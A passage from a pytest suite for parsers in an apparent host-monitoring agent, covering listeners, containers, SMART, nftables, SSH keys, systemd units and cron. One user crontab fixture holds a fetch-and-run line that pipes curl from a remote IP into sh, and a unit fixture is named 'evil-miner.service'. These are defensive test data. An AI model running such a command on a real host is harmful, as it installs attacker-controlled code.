    if value == ["line one", "line two"]:
        assert entry["message"] == "line one|line two"


def test_output_cut_mid_line_keeps_every_complete_entry_and_says_so() -> None:
    # 260 warnings of 4000 characters, cut at the 1 MiB event limit.
    lines = [journal_line("w" * 4000, priority="3", usec=1790798352000000 + i)
             for i in range(260)]
    raw = ("\n".join(lines) + "\n").encode()[: 1 << 20]
    complete = raw.count(b"\n")
    data = roundtrip(parse("journal.errors", raw))
    assert data["truncated"] is True and data["skipped"] == 0
    assert data["count"] == complete
    assert data["entries"][-1]["at"] == pytest.approx(1790798352 + (complete - 1) / 1e6)


def test_output_that_ends_without_a_newline_but_whole_is_not_truncated() -> None:
    data = p("journal.errors", journal_line("m", priority="3"))
    assert (data["count"], data["truncated"]) == (1, False)


SS = """\
udp UNCONN 0      0                 0.0.0.0:41502 0.0.0.0:*
udp UNCONN 0      0           127.0.0.53%lo:53    0.0.0.0:*
udp UNCONN 0      0             224.0.0.251:5353  0.0.0.0:* users:(("chrome",pid=22122,fd=106))
udp UNCONN 0      0                       *:37022       *:* users:(("firefox-bin",pid=21433,fd=169))
udp UNCONN 0      0                    [::]:111      [::]:*
tcp LISTEN 0      4096            127.0.0.1:8200  0.0.0.0:*

tcp LISTEN 0      4096              0.0.0.0:22    0.0.0.0:* users:(("sshd",pid=1400,fd=3),("systemd",pid=1,fd=50))
tcp LISTEN 0      50     [::ffff:127.0.0.1]:6189        *:* users:(("devtool",pid=24015,fd=238))
tcp LISTEN 0      4096                [::1]:631      [::]:*
udp UNCONN 0      0       [fe80::1c2:3ff:fe4:5]%wlan0:546 [::]:*
"""  # noqa: E501 — real tool output, kept at its real width


def test_listeners() -> None:
    data = p("listeners", SS)
    assert data["count"] == 10
    assert data["wildcard_count"] == 4
    assert data["listeners"][6] == {
        "proto": "tcp", "state": "LISTEN", "address": "0.0.0.0", "interface": "", "port": 22,
        "process": "sshd", "pid": 1400, "wildcard": True, "loopback": False}
    resolver = data["listeners"][1]
    assert (resolver["address"], resolver["interface"], resolver["loopback"]) == (
        "127.0.0.53", "lo", True)
    assert data["listeners"][2]["wildcard"] is False  # multicast is not a wildcard bind
    assert data["listeners"][3]["address"] == "*" and data["listeners"][3]["wildcard"]
    assert data["listeners"][4]["address"] == "::" and data["listeners"][4]["pid"] is None
    assert data["listeners"][7]["loopback"] is True  # v4-mapped loopback
    assert data["listeners"][8]["loopback"] is True
    link_local = data["listeners"][9]
    assert (link_local["address"], link_local["interface"], link_local["port"]) == (
        "fe80::1c2:3ff:fe4:5", "wlan0", 546)


def test_listeners_none() -> None:
    assert p("listeners", "") == {"listeners": [], "count": 0, "wildcard_count": 0,
                                  "skipped": 0}


@pytest.mark.parametrize("raw", ["tcp LISTEN 0 4096\n", "tcp LISTEN 0 4096 127.0.0.1:http 0:*\n",
                                 "tcp LISTEN 0 4096 127.0.0.1 0.0.0.0:*\n",
                                 "tcp LISTEN 0 4096 bogus-host:80 0.0.0.0:*\n"])
def test_listeners_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("listeners", raw.encode())


def test_kernel_tainted() -> None:
    assert p("kernel.tainted", "12289\n") == {"value": 12289, "flags": "POE", "bits": [0, 12, 13]}
    assert p("kernel.tainted", "0\n") == {"value": 0, "flags": "", "bits": []}
    assert p("kernel.tainted", str(1 << 4 | 1 << 7 | 1 << 30))["flags"] == "MD?"
    for bad in (b"", b"-1\n", b"POE\n"):
        with pytest.raises(ParseError):
            parse("kernel.tainted", bad)


def test_protected_hardlinks() -> None:
    assert p("fs.protected_hardlinks", "1\n") == {"value": 1, "protected": True}
    assert p("fs.protected_hardlinks", "0\n") == {"value": 0, "protected": False}
    for bad in (b"", b"on\n"):
        with pytest.raises(ParseError):
            parse("fs.protected_hardlinks", bad)


def test_protected_hardlinks_reads_this_host() -> None:
    """The real file, read unprivileged (it is 0644), parses."""
    with open("/proc/sys/fs/protected_hardlinks", "rb") as file:
        assert p("fs.protected_hardlinks", file.read().decode())["value"] in (0, 1)


def container(name: str, state: str, status: str, **extra: Any) -> dict[str, Any]:
    body = {"Id": "dc4e64e4e3d0c8d1581123334e97646fd804ab32885cb30ab53e413ed28f51b9",
            "Names": [f"/{name}"], "Image": f"{name}-image", "ImageID": "sha256:152b",
            "Command": "/entrypoint --api-key=sk-live-0123456789abcdef", "Created": 1790798080,
            "Ports": [], "Labels": {"com.docker.compose.project": "shopfront"},
            "State": state, "Status": status, "HostConfig": {"NetworkMode": "bridge"},
            "NetworkSettings": {"Networks": {}}, "Mounts": []}
    body.update(extra)
    return body


DOCKER = json.dumps([
    container("shopfront-worker-1", "restarting", "Restarting (1) 57 seconds ago"),
    container("shopfront-api-1", "running", "Up 2 hours (healthy)",
              Health={"Status": "healthy", "FailingStreak": 0}),
    container("shopfront-postgres-1", "exited", "Exited (255) 2 hours ago", Labels=None),
    container("old-api", "running", "Up 3 minutes (unhealthy)"),
    container("init", "running", "Up 1 second (health: starting)",
              Health={"Status": "none", "FailingStreak": 0}),
])


def test_containers() -> None:
    data = p("containers", DOCKER)
    assert data["count"] == 5
    assert data["by_state"] == {"restarting": 1, "running": 3, "exited": 1}
    assert data["containers"][0] == {
        "id": "dc4e64e4e3d0", "name": "shopfront-worker-1", "image": "shopfront-worker-1-image",
        "state": "restarting", "status": "Restarting (1) 57 seconds ago", "health": "",
        "exit_code": 1, "created": 1790798080, "compose_project": "shopfront",
        "published": [], "network_mode": "bridge", "host_mounts": []}
    assert data["containers"][1]["health"] == "healthy"
    assert data["containers"][1]["exit_code"] is None
    assert data["containers"][2]["exit_code"] == 255
    assert data["containers"][2]["compose_project"] == ""
    assert data["containers"][3]["health"] == "unhealthy"  # older engines: only in Status
    assert data["containers"][4]["health"] == "starting"
    assert "sk-live" not in json.dumps(data)  # the command line is not carried at all


def test_a_containers_published_ports_network_and_host_mounts() -> None:
    raw = json.dumps([container(
        "redis", "running", "Up 2 hours", HostConfig={"NetworkMode": "host"},
        Ports=[{"IP": "0.0.0.0", "PrivatePort": 6379, "PublicPort": 6379, "Type": "tcp"},
               {"IP": "::", "PrivatePort": 6379, "PublicPort": 6379, "Type": "tcp"},
               {"PrivatePort": 6380, "Type": "tcp"}],  # exposed, not published
        Mounts=[{"Type": "bind", "Source": "/var/run/docker.sock"},
                {"Type": "volume", "Source": "/mnt/docker/volumes/x/_data"},
                {"Type": "bind", "Source": "/"}])])
    (c,) = p("containers", raw)["containers"]
    assert c["published"] == [
        {"ip": "0.0.0.0", "port": 6379, "container_port": 6379, "proto": "tcp"},
        {"ip": "::", "port": 6379, "container_port": 6379, "proto": "tcp"}]
    assert c["network_mode"] == "host" and c["host_mounts"] == ["/", "/var/run/docker.sock"]
    # An older Engine leaves HostConfig and Mounts out: nothing published, no mode, no mounts.
    bare = {k: v for k, v in container("a", "running", "Up").items()
            if k not in ("HostConfig", "Mounts", "Ports")}
    (c,) = p("containers", json.dumps([bare]))["containers"]
    assert (c["published"], c["network_mode"], c["host_mounts"]) == ([], "", [])


@pytest.mark.parametrize("raw", ["", "{}", "[1]", json.dumps([{"Id": "x"}]),
                                 json.dumps([container("a", "running", "Up", Names=[])]),
                                 json.dumps([container("a", "running", "Up", Created="now")]),
                                 json.dumps([container("a", "running", "Up", Created=True)])])
def test_containers_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("containers", raw.encode())


def test_edac() -> None:
    raw = frame_files({
        "/sys/devices/system/edac/mc/mc0/ce_count": b"3\n",
        "/sys/devices/system/edac/mc/mc0/ue_count": b"0\n",
        "/sys/devices/system/edac/mc/mc1/ce_count": b"0\n",
        "/sys/devices/system/edac/mc/mc1/ue_count": b"1\n",
    })
    assert p("edac", raw) == {"controllers": [
        {"mc": "mc0", "ce_count": 3, "ue_count": 0}, {"mc": "mc1", "ce_count": 0, "ue_count": 1}],
        "ce_total": 3, "ue_total": 1, "skipped": 0}
    # This host has no EDAC driver loaded: the glob matches nothing.
    assert p("edac", frame_files({})) == {"controllers": [], "ce_total": 0, "ue_total": 0,
                                          "skipped": 0}
    with pytest.raises(ParseError):
        parse("edac", frame_files({"/sys/devices/system/edac/mc/mc0/ce_count": b"lots\n"}))
    with pytest.raises(ParseError):
        parse("edac", frame_files({"/sys/devices/system/edac/mc/mc0/other": b"1\n"}))


# --- slow tier --------------------------------------------------------------------------------

# Written by hand (smartctl needs root): the shape of smartmontools 7.4 `smartctl -j -a` on an
# NVMe drive, with the fields this parser reads and a few it ignores.
SMART_NVME = json.dumps({
    "json_format_version": [1, 0],
    "smartctl": {"version": [7, 4], "svn_revision": "5530", "exit_status": 0},
    "local_time": {"time_t": 1790798352},
    "device": {"name": "/dev/nvme0n1", "info_name": "/dev/nvme0n1", "type": "nvme",
               "protocol": "NVMe"},
    "model_name": "Samsung SSD 980 PRO 2TB", "serial_number": "S000EXAMPLE0000",
    "firmware_version": "5B2QGXA7",
    "smart_support": {"available": True, "enabled": True},
    "smart_status": {"passed": True, "nvme": {"value": 0}},
    "nvme_smart_health_information_log": {
        "critical_warning": 0, "temperature": 51, "available_spare": 100,
        "available_spare_threshold": 10, "percentage_used": 2, "data_units_read": 51880042,
        "data_units_written": 64770386, "host_reads": 424567897, "host_writes": 1060209003,
        "controller_busy_time": 2155, "power_cycles": 212, "power_on_hours": 3121,
        "unsafe_shutdowns": 27, "media_errors": 0, "num_err_log_entries": 0,
        "warning_temp_time": 0, "critical_comp_time": 0, "temperature_sensors": [51, 57]},
    "temperature": {"current": 51}, "power_cycle_count": 212,
    "power_on_time": {"hours": 3121},
})

# Written by hand: a SATA disk through the SAT layer, failing, with exit status bit 3 (disk
# failing) and bit 6 (error log) set, as smartctl reports it.
SMART_ATA = json.dumps({
    "json_format_version": [1, 0],
    "smartctl": {"version": [7, 4], "exit_status": 72},
    "device": {"name": "/dev/sda", "info_name": "/dev/sda [SAT]", "type": "sat",
               "protocol": "ATA"},
    "model_family": "Western Digital Blue", "model_name": "WDC WD20EZAZ-00GGJB0",
    "serial_number": "WD-WX00A000000", "firmware_version": "80.00A80",
    "smart_status": {"passed": False},
    "ata_smart_attributes": {"revision": 16, "table": [
        {"id": 5, "name": "Reallocated_Sector_Ct", "value": 1, "worst": 1, "thresh": 140,
         "when_failed": "now", "raw": {"value": 2012, "string": "2012"}},
        {"id": 9, "name": "Power_On_Hours", "value": 60, "worst": 60, "thresh": 0,
         "when_failed": "", "raw": {"value": 29610, "string": "29610"}},
        {"id": 187, "name": "Reported_Uncorrect", "value": 100, "worst": 100, "thresh": 0,
         "when_failed": "", "raw": {"value": 14, "string": "14"}},
        {"id": 197, "name": "Current_Pending_Sector", "value": 200, "worst": 200, "thresh": 0,
         "when_failed": "", "raw": {"value": 8, "string": "8"}},
        {"id": 198, "name": "Offline_Uncorrectable", "value": 200, "worst": 200, "thresh": 0,
         "when_failed": "past", "raw": {"value": 3, "string": "3"}},
        {"id": 199, "name": "UDMA_CRC_Error_Count", "value": 200, "worst": 200, "thresh": 0,
         "when_failed": "", "raw": {"value": 0, "string": "0"}},
    ]},
    "power_on_time": {"hours": 29610}, "power_cycle_count": 1403,
    "temperature": {"current": 38},
})


def test_smart_nvme() -> None:
    assert p("smart.nvme0n1", SMART_NVME) == {
        "device": "/dev/nvme0n1", "type": "nvme", "protocol": "NVMe",
        "model": "Samsung SSD 980 PRO 2TB", "serial": "S000EXAMPLE0000",
        "firmware": "5B2QGXA7", "exit_status": 0, "passed": True, "temperature_c": 51,
        "power_on_hours": 3121, "power_cycles": 212, "critical_warning": 0,
        "available_spare_pct": 100, "available_spare_threshold_pct": 10, "percentage_used": 2,
        "media_errors": 0, "error_log_entries": 0, "unsafe_shutdowns": 27,
        "reallocated_sectors": None, "pending_sectors": None, "offline_uncorrectable": None,
        "reported_uncorrect": None, "udma_crc_errors": None, "failing_attributes": [],
        "skipped": 0}


def test_smart_ata_failing() -> None:
    data = p("smart.sda", SMART_ATA)
    assert data["passed"] is False and data["exit_status"] == 72
    assert (data["reallocated_sectors"], data["pending_sectors"], data["offline_uncorrectable"],
            data["reported_uncorrect"], data["udma_crc_errors"]) == (2012, 8, 3, 14, 0)
    assert data["failing_attributes"] == ["Reallocated_Sector_Ct", "Offline_Uncorrectable"]
    assert data["critical_warning"] is None and data["media_errors"] is None
    assert (data["temperature_c"], data["power_on_hours"], data["power_cycles"]) == (
        38, 29610, 1403)


def test_smart_device_without_health_data_still_parses_to_nulls() -> None:
    raw = json.dumps({"smartctl": {"exit_status": 4},
                      "device": {"name": "/dev/sdb", "type": "scsi", "protocol": "SCSI"}})
    data = p("smart.sdb", raw)
    assert data["passed"] is None and data["temperature_c"] is None and data["model"] == ""


@pytest.mark.parametrize("raw", [
    "", "[]", json.dumps({"device": {"name": "/dev/sda"}}),
    # Written by hand: what smartctl prints when it cannot open the device (exit bit 1).
    json.dumps({"smartctl": {"exit_status": 2, "messages": [
        {"string": "Smartctl open device: /dev/sda failed: Permission denied",
         "severity": "error"}]}, "device": {"name": "/dev/sda"}}),
    json.dumps({"smartctl": {"exit_status": 0}, "device": {"name": 3}}),
    json.dumps({"smartctl": {"exit_status": 0}, "device": {"name": "/dev/sda"},
                "temperature": {"current": "warm"}}),
])
def test_smart_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("smart.sda", raw.encode())


# Written by hand (nft needs root): the libnftables-json(5) shape of `nft -j list ruleset` for an
# inet filter table with a dropping input chain, plus a set, as nftables 1.0.9 prints it.
NFT = {"nftables": [
    {"metainfo": {"version": "1.0.9", "release_name": "Old Doc Yak #3", "json_schema_version": 1}},
    {"table": {"family": "inet", "name": "filter", "handle": 1}},
    {"chain": {"family": "inet", "table": "filter", "name": "input", "handle": 1,
               "type": "filter", "hook": "input", "prio": 0, "policy": "drop"}},
    {"chain": {"family": "inet", "table": "filter", "name": "allow_ssh", "handle": 2}},
    {"set": {"family": "inet", "name": "trusted", "table": "filter", "type": "ipv4_addr",
             "handle": 3, "elem": ["10.0.0.2"]}},
    {"rule": {"family": "inet", "table": "filter", "chain": "input", "handle": 4, "expr": [
        {"match": {"op": "in", "left": {"ct": {"key": "state"}},
                   "right": ["established", "related"]}}, {"accept": None}]}},
    {"rule": {"family": "inet", "table": "filter", "chain": "input", "handle": 5, "expr": [
        {"match": {"op": "==", "left": {"meta": {"key": "iifname"}}, "right": "lo"}},
        {"accept": None}]}},
    {"rule": {"family": "inet", "table": "filter", "chain": "allow_ssh", "handle": 6,
              "expr": [{"accept": None}]}},
    {"table": {"family": "ip", "name": "nat", "handle": 2}},
    {"chain": {"family": "ip", "table": "nat", "name": "POSTROUTING", "handle": 1,
               "type": "nat", "hook": "postrouting", "prio": 100, "policy": "accept"}},
]}


def test_firewall() -> None:
    data = p("firewall", json.dumps(NFT))
    assert {k: v for k, v in data.items() if k != "hash"} == {
        "version": "1.0.9", "tables": 2, "chains": 3, "rules": 3, "sets": 1,
        "table_names": ["inet filter", "ip nat"],
        "base_chains": [
            {"family": "inet", "table": "filter", "name": "input", "hook": "input",
             "type": "filter", "priority": 0, "policy": "drop", "rules": 2},
            {"family": "ip", "table": "nat", "name": "POSTROUTING", "hook": "postrouting",
             "type": "nat", "priority": 100, "policy": "accept", "rules": 0}]}
    assert len(data["hash"]) == 64


def test_firewall_hash_ignores_handles_and_version_but_not_rules() -> None:
    base = p("firewall", json.dumps(NFT))["hash"]
    renumbered = json.loads(json.dumps(NFT).replace('"handle": 4', '"handle": 40'))
    renumbered["nftables"][0]["metainfo"]["version"] = "1.1.0"
    assert p("firewall", json.dumps(renumbered))["hash"] == base
    loosened = json.loads(json.dumps(NFT).replace('"policy": "drop"', '"policy": "accept"'))
    assert p("firewall", json.dumps(loosened))["hash"] != base


def test_firewall_hash_ignores_counter_values_but_not_counters() -> None:
    """iptables-nft puts a counter on every rule, so the hash moved with traffic alone."""
    def counted(packets: int, bytes_: int) -> dict:
        ruleset = json.loads(json.dumps(NFT))
        ruleset["nftables"][5]["rule"]["expr"].insert(
            0, {"counter": {"packets": packets, "bytes": bytes_}})
        ruleset["nftables"].append({"counter": {"family": "inet", "table": "filter",
                                                "name": "hits", "packets": packets,
                                                "bytes": bytes_}})
        return ruleset
    base = p("firewall", json.dumps(counted(0, 0)))["hash"]
    assert p("firewall", json.dumps(counted(1834, 220917)))["hash"] == base
    assert base != p("firewall", json.dumps(NFT))["hash"]


def test_firewall_empty_ruleset() -> None:
    data = p("firewall", json.dumps({"nftables": [NFT["nftables"][0]]}))
    assert (data["tables"], data["chains"], data["rules"], data["base_chains"]) == (0, 0, 0, [])


@pytest.mark.parametrize("raw", ["", "[]", '{"nftables": {}}', '{"nftables": [1]}',
                                 '{"nftables": [{"table": 1}]}',
                                 '{"nftables": [{"chain": {"family": "inet", "hook": "input"}}]}'])
def test_firewall_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("firewall", raw.encode())


MODULES = """\
udp_diag 12288 0 - Live 0x0000000000000000
zfs 6602752 6 - Live 0x0000000000000000 (PO)
spl 180224 1 zfs, Live 0x0000000000000000 (O)
nvidia 14426112 395 nvidia_uvm,nvidia_modeset, Live 0x0000000000000000 (OE)
dying 4096 0 - Unloading 0x0000000000000000
"""


def test_kernel_modules() -> None:
    assert p("kernel.modules", MODULES) == {
        "modules": ["dying", "nvidia", "spl", "udp_diag", "zfs"], "count": 5,
        "tainting": {"zfs": "PO", "spl": "O", "nvidia": "OE"}, "not_live": ["dying"],
        "skipped": 0}
    for bad in (b"", b"zfs 6602752\n"):
        with pytest.raises(ParseError):
            parse("kernel.modules", bad)


def test_reboot_required() -> None:
    raw = frame_files({"/var/run/reboot-required": b"*** System restart required ***\n",
                       "/var/run/reboot-required.pkgs": b"linux-image-6.8.0-143-generic\n"
                                                        b"linux-base\n"})
    assert p("reboot.required", raw) == {
        "required": True, "packages": ["linux-base", "linux-image-6.8.0-143-generic"]}
    assert p("reboot.required", frame_files({})) == {"required": False, "packages": []}
    with pytest.raises(ParseError):
        parse("reboot.required", frame_files({"/var/run/reboot-required.bak": b""}))


def test_block_devices_listing() -> None:
    raw = frame_listing(["nvme1n1", "loop0", "nvme0n1", "sda"])
    assert p("block.devices", raw) == {"entries": ["loop0", "nvme0n1", "nvme1n1", "sda"],
                                       "count": 4, "links": {}}


# --- daily tier -------------------------------------------------------------------------------

# Public keys generated for this test with ssh-keygen; the fingerprints are ssh-keygen -l's.
ED25519 = ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN1MpjqBPBtO3wsyPjHHITl5So05+OJSjGSHvD3GOjfc"
           " alice@workstation")
ED25519_FP = "SHA256:m37KsxCu6K0IqrVAb31EhIKWxFpTtf5JlXS746pqK8A"
ECDSA = ("ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN8Whk73U+6XXn"
         "54kWhSzHSu4Nfnbw10nIbzeoiCw8xxSCX0lxdsMcr8ZLAEp5QoqvBPalU4oPRitC01plWIhR4= deploy")
ECDSA_FP = "SHA256:Qh3onn9TmOZ3eBsCspfEYfuM2VHAXc6mme5BJuz44es"


def test_authorized_keys() -> None:
    alice = f"# laptop\n{ED25519}\n\n".encode()
    bob = (f'command="/usr/bin/backup --run",no-pty {ECDSA}\nnot a key at all\n'
           f"ssh-rsa !!!notbase64!!! broken\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB0 bad-padding\n"
           ).encode()
    data = p("ssh.keys.home", frame_files({"/home/alice/.ssh/authorized_keys": alice,
                                           "/home/bob/.ssh/authorized_keys2": bob}))
    assert data["count"] == 2
    assert data["keys"] == [
        {"path": "/home/alice/.ssh/authorized_keys", "type": "ssh-ed25519",
         "fingerprint": ED25519_FP, "comment": "alice@workstation", "options": False},
        {"path": "/home/bob/.ssh/authorized_keys2", "type": "ecdsa-sha2-nistp256",
         "fingerprint": ECDSA_FP, "comment": "deploy", "options": True}]
    files = {f["path"]: f for f in data["files"]}
    assert files["/home/alice/.ssh/authorized_keys"]["keys"] == 1
    assert files["/home/bob/.ssh/authorized_keys2"]["invalid_lines"] == 3
    assert len(files["/home/alice/.ssh/authorized_keys"]["sha256"]) == 64


def test_authorized_keys_absent() -> None:
    assert p("ssh.keys.root", frame_files({})) == {"files": [], "keys": [], "count": 0,
                                                   "dropped": 0}


def ssh_keys(n: int, comment: bytes = b"x") -> bytes:
    """`n` distinct, validly encoded ed25519-shaped keys."""
    return b"".join(b"ssh-ed25519 " + base64.b64encode(i.to_bytes(4, "big") + bytes(28)) +
                    b" " + comment + b"\n" for i in range(n))


def test_authorized_keys_keep_a_bounded_number_and_count_the_rest() -> None:
    """One home's file cannot crowd out another's: each keeps at most MAX_KEYS_PER_FILE."""
    data = p("ssh.keys.home", frame_files({
        "/home/aaa/.ssh/authorized_keys": ssh_keys(3000),
        "/home/zoe/.ssh/authorized_keys": f"{ED25519}\n".encode()}))
    files = {f["path"]: f for f in data["files"]}
    assert files["/home/aaa/.ssh/authorized_keys"]["keys"] == 3000
    assert files["/home/aaa/.ssh/authorized_keys"]["dropped"] == 3000 - MAX_KEYS_PER_FILE
    assert files["/home/zoe/.ssh/authorized_keys"]["dropped"] == 0
    assert data["keys"][-1]["fingerprint"] == ED25519_FP
    assert (data["count"], data["dropped"]) == (MAX_KEYS_PER_FILE + 1, 3000 - MAX_KEYS_PER_FILE)


def test_an_authorized_key_comment_is_redacted_and_cut() -> None:
    """A comment is free text: a private key block pasted into one is cut, and a long one kept
    to ARGS_CHARS, without reading past REDACT_CHARS (it reached redaction whole)."""
    hostile = b"-----BEGIN PRIVATE KEY----- " * 8000
    (key,) = p("ssh.keys.home", frame_files({"/home/a/.ssh/authorized_keys": ssh_keys(
        1, b"me -----BEGIN OPENSSH PRIVATE KEY-----\x01b3Blbn")}))["keys"]
    assert key["comment"] == f"me {MASK}"
    (key,) = p("ssh.keys.home", frame_files({"/home/a/.ssh/authorized_keys": ssh_keys(
        1, b"a" * (ARGS_CHARS + 50) + hostile)}))["keys"]
    assert key["comment"] == "a" * ARGS_CHARS


def test_the_worst_authorized_keys_the_caps_allow_still_publishes() -> None:
    """Four files of 3000 keys fit the read caps and grew into an event over the
    1 MiB limit, so the whole observation was dropped. Comments here are at their cap in the
    characters JSON escapes longest, as in the crontab case above."""
    worst = ("\U0001f600" * 2).encode() + b"\x01\xff"
    for comment in (b"x", worst * (ARGS_CHARS // 2)):
        parsed = parse("ssh.keys.home", frame_files({f"/home/u{i}/.ssh/authorized_keys":
                                                     ssh_keys(3000, comment) for i in range(4)}))
        assert parsed["dropped"] > 0
        data, _ = redact_mapping(parsed)
        event = schema.Event(schema.Kind.OBSERVATION, 1.0, "agent", "obs.ssh.keys.home",
                             schema.to_body(schema.Observation("ssh.keys.home", data, 1000, True)))
        assert len(schema.encode_event(event)) < schema.MAX_BYTES


def test_scheduled_directory_names() -> None:
    chrome = "/opt/google/chrome/cron/google-chrome"
    raw = frame_listing(["google-chrome", ".placeholder", "dpkg"],
                        {"google-chrome": chrome, "gone": "/tmp/x"})   # only listed names
    for probe in ("cron.d.names", "cron.hourly.names", "cron.daily.names", "cron.weekly.names",
                  "cron.monthly.names"):
        assert p(probe, raw) == {"entries": [".placeholder", "dpkg", "google-chrome"],
                                 "count": 3, "links": {"google-chrome": chrome}}


def test_a_link_target_is_cut_and_redacted_like_any_text_from_the_host() -> None:
    long = "/opt/" + "a" * 400
    secret = "/tmp/run --password=hunter2hunter2"
    data = p("cron.daily.names", frame_listing(["x", "y"], {"x": long, "y": secret}))
    assert data["links"]["x"] == long[:ARGS_CHARS]
    assert "hunter2" not in data["links"]["y"] and MASK in data["links"]["y"]


def listing(names: object, links: object = None) -> bytes:
    return json.dumps({"names": names, "links": {} if links is None else links}).encode()


@pytest.mark.parametrize("raw", [
    b"", b"{}", b'["a"]', b'{"names": ["a"]}', b'{"names": ["a"], "links": {}, "x": 1}',
    listing(["a", 1]), listing(["a/b"]), listing(["", "x"]), listing(["a", "a"]),
    listing("a"), listing(["a"], ["a"]), listing(["a"], {"b": "/x"}), listing(["a"], {"a": ""}),
    listing(["a"], {"a": 1})])
def test_listing_refuses(raw: bytes) -> None:
    with pytest.raises(ParseError):
        parse("block.devices", raw)


@pytest.mark.parametrize("raw", [b"", b"[]", b'{"/a": 1}', b'{"relative": "x"}'])
def test_files_framing_refuses(raw: bytes) -> None:
    with pytest.raises(ParseError):
        parse("ssh.keys.root", raw)


def test_framing_is_what_the_parsers_read() -> None:
    assert json.loads(frame_files({"/b": b"2", "/a": b"\xff"})) == {"/a": "�", "/b": "2"}
    assert json.loads(frame_listing(("b", "a"))) == {"names": ["a", "b"], "links": {}}


UNIT_FILES = json.dumps([
    {"unit_file": "proc-sys-fs-binfmt_misc.automount", "state": "static", "preset": None},
    {"unit_file": "ssh.service", "state": "enabled", "preset": "enabled"},
    {"unit_file": "cups.service", "state": "disabled", "preset": "enabled"},
    {"unit_file": "evil-miner.service", "state": "enabled", "preset": None},
    {"unit_file": "ctrl-alt-del.target", "state": "masked", "preset": None},
])


def test_units_files() -> None:
    assert p("units.files", UNIT_FILES) == {
        "units": {"proc-sys-fs-binfmt_misc.automount": "static", "ssh.service": "enabled",
                  "cups.service": "disabled", "evil-miner.service": "enabled",
                  "ctrl-alt-del.target": "masked"},
        "count": 5, "by_state": {"static": 1, "enabled": 2, "disabled": 1, "masked": 1},
        "skipped": 0}
    for bad in (b"", b"{}", b'[{"unit_file": "x"}]', b'[{"unit_file": 1, "state": "x"}]'):
        with pytest.raises(ParseError):
            parse("units.files", bad)


TIMERS = json.dumps([
    {"next": 1790799553364566, "left": 1790799553364566, "last": 1790795025472304,
     "passed": 4062554896, "unit": "fwupd-refresh.timer", "activates": "fwupd-refresh.service"},
    {"next": 1790834400000000, "left": 1790834400000000, "last": None, "passed": None,
     "unit": "logrotate.timer", "activates": "logrotate.service"},
    {"next": 0, "left": 0, "last": 0, "passed": 0, "unit": "fstrim.timer",
     "activates": "fstrim.service"},
])


def test_units_timers() -> None:
    assert p("units.timers", TIMERS) == {"count": 3, "skipped": 0, "timers": [
        {"unit": "fwupd-refresh.timer", "activates": "fwupd-refresh.service",
         "next": 1790799553.364566, "last": 1790795025.472304},
        {"unit": "logrotate.timer", "activates": "logrotate.service", "next": 1790834400.0,
         "last": None},
        {"unit": "fstrim.timer", "activates": "fstrim.service", "next": None, "last": None}]}
    for bad in (b"", b"{}", b'[{"unit": "x.timer"}]',
                b'[{"unit": "x", "activates": "y", "next": "soon", "last": null}]'):
        with pytest.raises(ParseError):
            parse("units.timers", bad)


# --- scheduled work ---------------------------------------------------------------------------

# /etc/crontab and /etc/cron.d as Ubuntu 24.04 ships them, trimmed.
CRONTAB = """# /etc/crontab: system-wide crontab
SHELL=/bin/sh
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# *  *  *  *  * user-name command to be executed
17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly
25 6\t* * *\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
#
"""
CRON_D = {
    "/etc/cron.d/sysstat": b"""PATH=/usr/lib/sysstat:/usr/sbin:/usr/bin:/sbin:/bin

# Activity reports every 10 minutes everyday
5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1
""",
    "/etc/cron.d/zfsutils-linux": b"""# Scrub the second Sunday of every month.
24 0 8-14 * * root if [ $(date +\\%w) -eq 0 ] && [ -x /usr/lib/zfs-linux/scrub ]; then /usr/lib/zfs-linux/scrub; fi
""",  # noqa: E501 — real tool output, kept at its real width
}


def test_cron_system() -> None:
    assert p("cron.system", CRONTAB) == {
        "files": [{"path": "/etc/crontab", "env": {"SHELL": "/bin/sh"}, "env_dropped": 0,
                   "entries": 2, "total": 2, "dropped": 0, "skipped": 0}],
        "entries": [
            {"file": "/etc/crontab", "user": "root", "schedule": "17 * * * *",
             "command": "cd / && run-parts --report /etc/cron.hourly", "stdin": False},
            {"file": "/etc/crontab", "user": "root", "schedule": "25 6 * * *",
             "command": "test -x /usr/sbin/anacron || { cd / && run-parts --report "
                        "/etc/cron.daily; }", "stdin": False}],
        "count": 2, "skipped": 0, "dropped": 0, "redacted": 0}


def test_cron_d_reads_every_file_and_an_escaped_percent_is_not_stdin() -> None:
    data = p("cron.d", frame_files(CRON_D))
    assert [f["path"] for f in data["files"]] == sorted(CRON_D)
    assert data["files"][0]["env"] == {"PATH": "/usr/lib/sysstat:/usr/sbin:/usr/bin:/sbin:/bin"}
    assert data["files"][1]["env"] == {}
    sysstat, zfs = data["entries"]
    assert sysstat == {"file": "/etc/cron.d/sysstat", "user": "root",
                       "schedule": "5-55/10 * * * *",
                       "command": "command -v debian-sa1 > /dev/null && debian-sa1 1 1",
                       "stdin": False}
    assert zfs["command"].startswith("if [ $(date +\\%w) -eq 0 ]")
    assert zfs["stdin"] is False
    assert (data["count"], data["skipped"]) == (2, 0)


def test_cron_user_takes_the_user_from_the_file_name_and_reads_at_words() -> None:
    raw = frame_files({
        "/var/spool/cron/crontabs/alice": b"""# DO NOT EDIT THIS FILE
MAILTO = alice@example.com
@reboot /home/alice/bin/start-agent
  */5 * * * *   /usr/bin/curl -s http://198.51.100.7/x | sh
0 9 * * mon-fri mail -s hi alice%Hello%there
""",
        "/var/spool/cron/crontabs/bob": b"",
    })
    data = p("cron.user", raw)
    assert data["files"] == [
        {"path": "/var/spool/cron/crontabs/alice", "env": {"MAILTO": "alice@example.com"},
         "env_dropped": 0, "entries": 3, "total": 3, "dropped": 0, "skipped": 0},
        {"path": "/var/spool/cron/crontabs/bob", "env": {}, "env_dropped": 0, "entries": 0,
         "total": 0, "dropped": 0, "skipped": 0}]
